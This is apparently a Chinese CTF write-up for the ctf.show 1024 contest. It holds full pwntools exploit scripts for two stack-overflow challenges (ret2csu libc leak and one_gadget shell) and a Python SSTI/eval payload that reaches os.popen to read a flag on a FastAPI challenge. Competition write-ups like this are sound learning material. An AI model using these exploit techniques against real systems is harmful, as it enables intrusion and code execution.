title: ctf-show 1024杯
categories: [CTF]
tags: [wp,web,pwn]

---

1024嘛,周末抽空看了下ctfshow1024杯,题总体简单就是参赛晚了。没什么时间打了。

<!--more-->
## pwn

### 1024_happy_stack

![image-20201027162241325](image-20201027162241325.png)

分析题目发现是一个栈溢出,但是要绕一个ctfshow函数.

![image-20201027141150383](image-20201027141150383.png)

观测发现我们可以用'\00'来截断strcmp的检查.

![image-20201027162743178](image-20201027162743178.png)

在植入shell时,直接用gadget的方法(学习后发现真的好用)

```python
from pwn import *
from LibcSearcher import LibcSearcher
#from one_gadget import generate_one_gadget

e=ELF('./pwn1')

context.terminal = ['tmux', 'splitw', '-h']

#p=remote('111.231.70.44', 28097)
p=process('./pwn1')


def csu(rbx,rbp,r12,r13,r14,r15):
	pay='36D\00\00'+'a'*(0x380-5)+p64(0)+p64(0x00000000004007F6)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(0x00004007E0)+'\00'*48+p64(0)+p64(e.symbols['main'])

        return pay


print(p.recv())

pay=csu(0,1,e.got['puts'],e.got['puts'],0,0)


p.sendline(pay)
sleep(2)
p.recvuntil('36D\n')
sleep(2)
real_puts=u64(p.recv(6).ljust(8,'\x00'))
print(real_puts)

libc = LibcSearcher('puts', (real_puts))
libcbase =(real_puts) - libc.dump('puts')
#gdb.attach(p,'b puts')
print(hex(libcbase))
one_gadget=libcbase+0x45226

payload ='36D'+'\x00'+'\x00'*0x384
payload+=p64(one_gadget)

sleep(2)

print(p.recv())
sleep(2)

p.sendline(payload)
sleep(2)

p.interactive()
```

### 1024_happy_checkin

这道感觉上一道简单直接one_gadget一把梭

```python
from pwn import *
from LibcSearcher import LibcSearcher
#from one_gadget import generate_one_gadget

e=ELF('./pwn2')

context.terminal = ['tmux', 'splitw', '-h']

#p=remote('111.231.70.44', 28075)
p=process('./pwn2')

print(p.recv())
print(e.symbols['main'])

#pay=csu(0,1,e.got['puts'],e.got['puts'],0,0)
pay='a'*0x370+p64(0)+p64(0x00004006e3)+p64(e.got['puts'])+p64(e.plt['puts'])+p64(e.symbols['main'])

p.sendline(pay)
sleep(1)
print(p.recvline())


real_puts=u64(p.recv(6).ljust(8,'\x00'))
print(real_puts)

libc = LibcSearcher('puts', (real_puts))
libcbase =(real_puts) - libc.dump('puts')
#gdb.attach(p,'b puts')
print(hex(libcbase))
one_gadget=libcbase+0x4f2c5

payload ='a'*0x370+p64(0)+p64(one_gadget)


p.sendline(payload)
sleep(1)

p.interactive()
```

## web

### 1024_fastapi

这道题有的意识表面考fastapi，实际就考了fastapi特性，更多的还是ssti。

![image-20201027164759063](image-20201027164759063.png)

进入/docs发现cccalccc存在ssti。故慢慢试探。

![image-20201027165432130](image-20201027165432130.png)

payload如下：

```python
# -*- coding: utf-8 -*- 

import requests
import re

r= requests.session()
url = 'http://1dadb4d7-6c85-4cbc-89df-92d370159f5b.chall.ctf.show/cccalccc'
headers = {'cookie':'UM_distinctid=1749ef3c1b2a-0ccbaee915c9eb8-4c312c7c-e1000-1749ef3c1bc46'}

#r.get(url).text
x=r.post(url,{'q':'str(().__class__.__base__.__subclasses__()[95].__init__.__globals__["__builtins__"]["__imp"+"ort__"]("os").__dict__["p"+"o"+"pen"]("cat /mnt/f1a9 ").read())'})
print (x.text)

```

